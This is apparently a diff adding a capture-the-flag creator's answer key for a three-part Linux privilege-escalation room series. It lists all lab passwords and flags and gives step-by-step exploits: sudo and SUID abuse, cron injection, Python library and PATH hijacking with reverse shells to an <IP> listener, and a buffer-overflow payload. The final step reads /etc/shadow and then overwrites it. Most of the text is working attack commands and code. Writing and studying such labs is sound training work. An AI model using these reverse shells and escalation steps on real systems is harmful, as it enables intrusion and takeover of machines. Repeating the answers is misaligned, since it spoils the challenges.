@@ -1,0 +1,356 @@
+Linux Priv Esc Series
+
+Task 1 - Priv Esc Easy:
+    Creds:
+        user0:password
+        user1:1m_th3_numb3r_0ne
+        user2:S1lv3r_M3d@l_h3Re
+        user3:m@C_0r_w1nD0w$?
+        user4:l1nUx_0bV1ou$Ly
+        root:Br1ng_m3_@_C0Ff3e
+    user1:
+        Rabbit hole: sudo
+            sudo -u user1 /home/user1/hello.out
+        Intended path: SUID base32
+            .password.txt file in /home/user1
+            Exploit cmd:
+                /usr/bin/base32 /home/user1/.password.txt | base32 -d
+                su user1
+        Flag: user1.txt
+            THM{SU1D_F1l3_SysT3m_@cCesS}
+    user2:
+        Rabbit hole: SUID
+            /usr/bin/diff --line-format=%L /dev/null /home/user1/.important.txt
+            user2 flag coulb be accessed but name modified and directory permissions reviewed
+        Intended path:
+            Sudo rule: 
+                (user2) NOPASSWD: /usr/bin/ssh
+            Exploit cmd:
+                sudo -u user2 /usr/bin/ssh -o ProxyCommand=';bash 0<&2 1>&2' x
+        Flag: user2_Fl@g.txt
+            THM{$ud0_1s_D@ngEroU$}
+    user3:
+        Rabbit hole: sudo
+            sudo -u user3 /usr/bin/ssh-keygen
+        Intended path:
+            Cronjob:
+                cat /home/user2/may_the_force_be_with_you > /home/user3/hello.py
+            Sudo rule: 
+                (user3) NOPASSWD: /home/user3/hello.py
+            Exploit cmd:
+                Create file: may_the_force_be_with_you in home/user2
+                may_the_force_be_with_you contains something like:
+                    #!/bin/bash
+                    bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
+                Wait for cronjob
+                Exploit:
+                sudo -u user3 /home/user3/hello.py
+    user4:
+        Rabbit hole: GUID
+            /usr/bin/env
+            Perm: 2770
+            Ownership: root:user3
+        Intended path:
+            Fully interactive shell may be required:
+                user2: sudo -u user3 ssh-keygen (rabbit hole initially)
+            root cronjob: 
+                /usr/share/hello/say_hello.sh
+                    gcc /usr/share/hello/say_hello.c -o /home/user4/say_h$
+                    chown user4:user4 /home/user4/say_hello.out
+                    sudo -u user4 /home/user4/say_hello.out | tee /dev/pts/0 /dev/pts/1 /dev/pts/2
+                Edit /usr/share/hello/say_hello.c:
+                    Put reverse shell in C
+                Set up nc listener:
+                    Wait for cronjob to run
+    root:
+        Intended path: Reverse Engineering SUID
+            Fully interactive shell required (can generate ssh-key for instance)
+            /bin/enigma
+            Program gives 4 numbers: a, b, c and d
+            Program asks a question:
+            Answer with the value of (a + b) * c / d
+            
+Task 2 - Priv Esc Medium:
+    Creds:
+        user0:password
+        user1:Alw@y$_g0lD_M3d@l
+        user2:D@mN_S1lV3r_@ga1n
+        user2.5:@m_1_Tw0_0r_ThR3e?
+        user3:0n_tH3_P0d1uM
+        user4:4_1s_UnluCkY
+        user5:d0_1_3v3n_Ex1$t?
+        root:Wh0'$_th3_B0s$?
+        ftp:D15c0'#'
+    user1:
+        Rabbit hole: cron tar wildcard injection
+            Folder files has immutable attribute
+        Intended path: sudo
+            user0   ALL=(user1:user1) NOPASSWD: /usr/local/bin/echo
+            /usr/local/bin/ perm = 777
+            secure_path=/usr/local/bin:...:/bin
+            Exploit cmd:
+                rm /usr/local/bin/echo
+                cp /bin/bash /usr/local/bin/echo
+                sudo -u user1 /usr/local/bin/echo
+        Flag:
+            THM{R1$ky_F0lD3r$_P3rMs}
+    user2:
+        Rabbit hole:
+            file alice.jpg in /home/user2
+            stegcracker with rockyou.txt on it:
+                passwd= wonderland
+                alice.jpg.out contains:
+                    Rabbit Hole def from urban dictionary
+        Intended path: Python library highjacking
+            File: hangman.py in /home/user2/Project
+                => Sudo & import base64 library
+                => base64 perm = 777
+                edit base64 library and put a shell for instance in base64.encode:
+                    pentestmonkey ones are fine:
+                        locate base64.py
+                        nano /usr/lib/python3.6/base64.py
+                            => "import socket,subprocess,os" on the top of the file
+                            => "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                                s.connect(("<IP>",1234))
+                                os.dup2(s.fileno(),0)
+                                os.dup2(s.fileno(),1)
+                                os.dup2(s.fileno(),2)
+                                p=subprocess.call(["/bin/bash","-i"])" in b64decode function
+                            => nc -lvnp 1234
+        Flag:
+            THM{PytH0n_H1ghJ@Cking}
+    user3:
+        Rabbit hole: sudo user2.5
+            sudoers: ALL=(user2.5:user2.5) NOPASSWD: /usr/bin/make
+            This user has no way to priv esc afterwards
+        Intended path: Makefile /home/user3/Shared_Project/
+            perm = 664
+            ownership = user3:user2
+            attribute = append-only
+            sudoers: ALL=(user3:user3) NOPASSWD: /usr/bin/make -f /home/user3/Shared_Project/Makefile
+            Exploit:
+                Create a file with appropriate format:
+                    "   /bin/bash"
+                    cat <file> >> /home/user3/Shared_Project/Makefile
+                    cd /home/user3/Shared_Project
+                    sudo -u user3 /usr/bin/make -f /home/user3/Shared_Project/Makefile re
+        Flag:
+            THM{M@k3f1L3$_@r3_U$3FuLl}
+    user4:
+        Rabbit hole:
+            /home/user3/responsability.txt
+            /home/user4/spider.c
+            /home/user4/spider
+            user4 crontab: /bin/cat /home/user3/responsability.txt | /home/user4/spider
+        Intended path: RE /usr/local/games/enigma_bis
+            sudo: ALL=(user4:user4) NOPASSWD: /usr/local/games/enigma_bis
+        How it works:
+            random 10 capital characters string generated
+            program displays the string
+            program asks for the answer
+            answer is:
+                When char lower than 'N'
+                    corresponding char in answer = lower char + 5
+                        ex: 'A' gives 'f'
+                When char greater or equal 'N'
+                    Corresponding char in answer = '0'
+                Example when program launched:
+                    Let's play a game !
+                    I say: XIWSLNCBPU
+                    What do you think ?
+                    Answer: 0n00q0hg00
+        Flag:
+            THM{3@sY_R3v3R$e_3nG1n33r1nG}
+    root:
+        Rabbit hole: Local http, port 80
+            curl or wget localhost
+            Port forwarding required for enumeration but nothing to find
+        Rabbit hole 2:
+            sudo: ALL=(user5:user5) NOPASSWD: /usr/local/games/enigma_third
+                Same as enigma_bis but:
+                    When char lower than 'N'
+                        corresponding char in answer = lower char + 2
+                    When char greater or equal 'N'
+                        Corresponding char in answer = 'z'
+        Intended path: Local FTP, port 12000
+            netstat -plunt
+            /etc/vsftpd.conf + /etc/vsftpd/user_list
+                => ftp open locally, port 12000
+                => Only ftp user can login
+            Port forward brute force: with /home/user4/music.txt
+                socat installed
+                Cmd local:
+                    socat TCP-LISTEN:1234,fork,reuseaddr TCP:localhost:12000
+                Cmd attacker:
+                    hydra -l ftp -P music.txt ftp://<IP>:1234/
+                    ftp passwd: D15c0'#' (3682 in music.txt)
+                Cmd local:
+                    ftp localhost 12000 OR su ftp and dir /var/backups
+                        Gives ftp Creds
+                    Extract: ftp_backup.tar.gz
+                        tar -xvf ftp_backup.tar.gz
+                            => user.txt + list.txt
+            John the ripper
+                john --wordlist=list.txt user.txt
+            su root
+        Note:
+            SSH login: Disabled for root + ftp
+        Possibility:
+            Write a script locally to brute force:
+                su ftp and/or su root
+        Flag:
+            THM{C0ngr@ts!!_Re@dY_f0R_tH3_Th1rD_Ep1s0d3?}
+
+Task 3 - Priv Esc Hard:
+    Creds:
+        user0:password
+        user1:I'm_H1dD3n
+        user2:I_@m_@_P@s$W0rd
+        user3:1$_iT_My_P@$s?
+        user4:F0uRTh_Us3R
+        root:H@Rd_b0X_L3@D3r
+    user1:
+	Rabbit hole: /home/user1/movie.txt
+		=> Decode: base58
+        Intended path: Enumeration apache2 subdomain + file enumeration
+            netstat -plunt => http locally
+            ls -l /var/www => subdomains
+            cat /etc/hosts => get subdomains lists
+            Copy this list: remove beginning and end of file:
+            Keep only hostnames:
+                sed 's/127.0.0.1\t//' /etc/hosts > subdomains.txt
+            If you access localhost or wrong subdomain:
+                You receive "Nothing to see here"
+            Write a script: Example in python3:
+               "import requests
+                f = open("subdomains.txt", "r")
+                for x in f:
+                    req = requests.get("http://{}/".format(x[:-1]))
+                    content = str(req.content, 'utf-8')
+                    if "Nothing" not in content[:-1]:
+                        print(x[:-1] + ":",  content[:-1])
+                "
+                Output:
+                "draft.localhost: This is draft
+                secret.localhost: This is secret"
+            Rabbit hole: 
+                => draft.localhost
+            Enumeration secret.localhost:
+                => Import list on target machine (common.txt or medium.txt)
+                Write a script: Example in python3:
+                "import requests
+                f = open("common.txt", "r")
+                for x in f:
+                    req = requests.get("http://secret.localhost/{}".format(x[:-1]))
+                    content = str(req.content, 'utf-8')
+                    if "secret" not in content[:-1]:
+                        print(x[:-1] + ":",  content[:-1])
+                "
+            You get user1 credentials with http://secret.localhost/notes
+        Flag:
+            THM{3NuM3r@T10n_1$_Th3_K3y}
+    user2:
+	Rabbit hole: /home/user2/tyler.txt
+		=> Decode: hex => base64 
+        Rabbit hole: ssh key
+            Can be read but private key does not fit the public key
+        Intended path: Sudo + Python PATH Exploit
+            /home/user1/hanoi.py imports /usr/lib/python3.6/hanoi_moves.py
+            /home/user1/hanoi.py is immutable to avoid user1 to rm it and create another one
+            Exploit:
+                Create hanoi_moves.py in /home/user1 that spawns a reverse shell:
+                    "import socket
+                    import subprocess
+                    import os
+                    import pty
+                    def TowerOfHanoi(n, source, destination, auxiliary):
+                        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                        s.connect(("<IP>",1234))
+                        os.dup2(s.fileno(),0)
+                        os.dup2(s.fileno(),1)
+                        os.dup2(s.fileno(),2)
+                        pty.spawn("/bin/bash")
+                    "
+                nc -lvnp <port> (attacker machine)
+                sudo -u user2 /usr/bin/python3 /home/user1/hanoi.py
+        Flag:
+            THM{PytH0n_P@Th_3Xpl01t@t10n}
+        Info:
+            user2 password is in a text file in case of fail attempt for next user
+    user3:
+        Rabbit hole: lee.txt
+            Vigenered encrypted: (password=bruce), can be brute forced online.
+        Intended path: Cronjob + Buffer overflow
+            root cronjob:
+                cd /home/user3/Project && /usr/bin/gcc -m32 -fno-stack-protector -no-pie -o main main.c libft.a && /bin/chown user3:user2 main && chmod 4750 main
+            /home/user3/Project/includes/ft.h: write permission + append only attribute:
+                Create file: for example, the file is called shell1.c:
+                    "#include <sys/types.h>
+                    #include <unistd.h>
+                    void	shell();"
+                cat shell1.c >> /home/user3/Project/includes/ft.h
+            main.c: append only attribute
+                Create file: for example, the file is called shell2.c:
+                "void shell()
+                {
+                    setreuid(1003,1003);
+                    system("/bin/bash");
+                }"
+                cat shell2.c >> /home/user3/Project/main.c
+            Wait for cronjob
+            Buffer overflow to get shell with user3 group:
+                gdb => EIP offset = 17
+                    Get shell memory address:
+                        info func (example: shell memory address = "0x080484fb")
+                To be executed outside gdb: (user3 group required for the next part)
+                    sudo -g user3 /home/user3/Project/main $(python -c "print 'A' * 17 + '\xfb\x84\x04\x08'")
+                        => user2 get user3 group (required for the following)
+        Flag:
+            THM{BuFbUfBuF_BuFf3R_0v3rFloOow}
+    user4:
+        Rabbit hole: SUID
+            /usr/bin/enigma_fourth
+                => result is fibonnacci result for given number
+            setreuid isnt set in program:
+                /bin/bash will been executed as user3
+        Intended path: SUID + PATH
+            /usr/local/bin/enigma_fourth
+                => result is fibonnacci result for given number
+                When appropriate result:
+                    execute: 
+                        setreuid(1004,1004);
+                        setregid(1004,1004); (you dont get users group, required for next step)
+                        system("echo 'Congratulations' `whoami | /bin/sed 's/4/3/'` '!' ");
+                Exploit cmd:
+                    export PATH=/tmp:$PATH
+                    create file "whoami" in /tmp
+                        "#!/bin/bash
+                        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'"
+                    chmod 777 /tmp/whoami
+                    Set up your nc listener
+                    Execute program and gives fibonnaci appropriate result
+        Flag:
+            THM{@n0Th3R_P@Th_EXpl01t@T1On}
+    root:
+        Intended path: openssl capabilities
+            getcap -r / 2> /dev/null
+                openssl =ep
+            openssl can only be used by "users" group:
+                => Need to generate ssh-private key and to login with it
+            Exploit needs 2 user4 accounts available:
+                With first user4:
+		    export PATH=/usr/share/openssl/:$PATH
+                    cd /tmp
+                    openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
+                    cd /
+                    openssl s_server -key /tmp/key.pem -cert /tmp/cert.pem -port 1234 -HTTP
+                With second user4:
+		    export PATH=/usr/share/openssl/:$PATH
+                    curl -k "https://127.0.0.1:1234/etc/shadow"
+                    nano /tmp/shadow (or adapt command file name)
+                        Copy previous shadow file but change root password ()
+                    openssl smime -encrypt -aes256 -in /tmp/shadow -binary -outform DER -out /tmp/shadow.enc /tmp/cert.pem
+                    cd /tmp && openssl smime -decrypt -in shadow.enc -inform DER -inkey key.pem -out /etc/shadow
+                    su root with updated password
+        Flag:
+            THM{Y0u_R0cK,_C0nGr@TuLAt10n$!!!}
